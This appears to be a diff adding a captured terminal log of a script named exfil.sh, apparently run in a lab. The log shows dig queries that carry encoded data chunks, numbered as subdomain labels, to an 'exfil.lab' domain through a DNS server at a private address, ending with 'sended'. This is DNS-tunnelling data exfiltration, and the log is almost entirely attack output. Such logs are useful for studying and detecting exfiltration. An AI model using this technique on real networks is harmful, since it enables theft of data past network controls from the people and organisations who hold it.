@@ -1,0 +1,31 @@
+$ bash exfil.sh
+; <<>> DiG 9.20.23-1-Debian <<>> 0.o8h0OzjeFAd7nFWTjNoMOAaq5Xjx6IxlnuN8jt8tNnxryOYc2X.exfil.lab @192.168.100.24 +time=1 +tries=1
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 60240
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+; EDE: 14 (Not Ready)
+;; QUESTION SECTION:
+;0.o8h0OzjeFAd7nFWTjNoMOAaq5Xjx6IxlnuN8jt8tNnxryOYc2X.exfil.lab. IN A
+
+;; Query time: 3 msec
+;; SERVER: 192.168.100.24#53(192.168.100.24) (UDP)
+;; WHEN: Tue Nov 17 18:04:30 EST 2026
+;; MSG SIZE  rcvd: 97
+
+; <<>> DiG 9.20.23-1-Debian <<>> 6.Xe7m0Y8X0chkhK586WRw9BTQEUdQfPhJ3A23FRExd8XTrcbYvi.exfil.lab @192.168.100.24 +time=1 +tries=1
+;; QUESTION SECTION:
+;6.Xe7m0Y8X0chkhK586WRw9BTQEUdQfPhJ3A23FRExd8XTrcbYvi.exfil.lab. IN A
+;; SERVER: 192.168.100.24#53(192.168.100.24) (UDP)
+;; WHEN: Tue Nov 17 18:04:30 EST 2026
+
+; <<>> DiG 9.20.23-1-Debian <<>> 12.nK1Nis9KZhNXSwDCBWSxqzqLpIrrxX8xaPhWNUjPB4K2EVE2BA.exfil.lab @192.168.100.24 +time=1 +tries=1
+;; QUESTION SECTION:
+;12.nK1Nis9KZhNXSwDCBWSxqzqLpIrrxX8xaPhWNUjPB4K2EVE2BA.exfil.lab. IN A
+;; SERVER: 192.168.100.24#53(192.168.100.24) (UDP)
+;; WHEN: Tue Nov 17 18:04:30 EST 2026
+
+sended
